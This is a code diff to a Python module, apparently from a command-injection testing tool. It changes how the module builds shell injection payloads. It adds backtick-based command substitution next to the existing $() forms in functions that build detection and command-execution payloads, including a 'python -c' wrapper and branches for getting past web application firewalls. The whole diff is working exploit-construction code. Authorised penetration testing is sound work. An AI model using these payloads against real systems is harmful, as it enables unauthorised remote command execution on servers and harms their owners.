@@ -37,20 +37,40 @@ def decision(separator, TAG, randv1, randv2):
               )  
   else:
     if not settings.WAF_ENABLED:
-      math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
+      if settings.USE_BACKTICKS:
+        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
+      else:  
+        math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
     else:
-      math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"
-    if settings.SKIP_CALC: 
-      payload = (separator +
-                "echo " + TAG +
-                "$(echo " + TAG + ")" + TAG + ""
-                 ) 
+      if settings.USE_BACKTICKS:
+        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
+      else:
+        math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"
+
+    if settings.SKIP_CALC:
+      if settings.USE_BACKTICKS:
+        payload = (separator +
+                  "echo " + TAG +
+                  TAG + "" + TAG + ""
+                   )  
+      else:  
+        payload = (separator +
+                  "echo " + TAG +
+                  "$(echo " + TAG + ")" + TAG + ""
+                   ) 
     else:
-      payload = (separator +
-                "echo " + TAG +
-                math_calc + 
-                "$(echo " + TAG + ")" + TAG + ""
-                 ) 
+      if settings.USE_BACKTICKS:
+        payload = (separator +
+                  "echo " + TAG +
+                  math_calc + 
+                  TAG + "" + TAG + ""
+                   )       
+      else:  
+        payload = (separator +
+                  "echo " + TAG +
+                  math_calc + 
+                  "$(echo " + TAG + ")" + TAG + ""
+                   ) 
   return payload
 
 """
@@ -103,13 +123,23 @@ def cmd_execution(separator, TAG, cmd):
     # if not settings.WAF_ENABLED:
     #   cmd_exec = "$(echo $(" + cmd + "))"
     # else:
-    cmd_exec = "$(" + cmd + ")"
-    payload = (separator +
-              "echo " + TAG +
-              "$(echo " + TAG + ")" +
-              cmd_exec +
-              "$(echo " + TAG + ")" + TAG + ""
-              )
+
+    if settings.USE_BACKTICKS:
+      cmd_exec = "`" + cmd + "`"
+      payload = (separator +
+                "echo " + TAG +
+                "" + TAG + "" +
+                cmd_exec +
+                "" + TAG + "" + TAG + ""
+                )
+    else:
+      cmd_exec = "$(" + cmd + ")"
+      payload = (separator +
+                "echo " + TAG +
+                "$(echo " + TAG + ")" +
+                cmd_exec +
+                "$(echo " + TAG + ")" + TAG + ""
+                )
   return payload
 
 """
@@ -128,9 +158,15 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                 )
                                                                       
   else:
-    payload = (separator +
-              "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" +cmd+ "))'%2B'" + TAG + "'%2B'" + TAG + "'\""
-              )
+
+    if settings.USE_BACKTICKS:
+      payload = (separator +
+                "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'`" + cmd + "`" + TAG + "'%2B'" + TAG + "'\""
+                )
+    else:              
+      payload = (separator +
+                "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(" + cmd + ")'%2B'" + TAG + "'%2B'" + TAG + "'\""
+                )
   return payload
 
 #eof
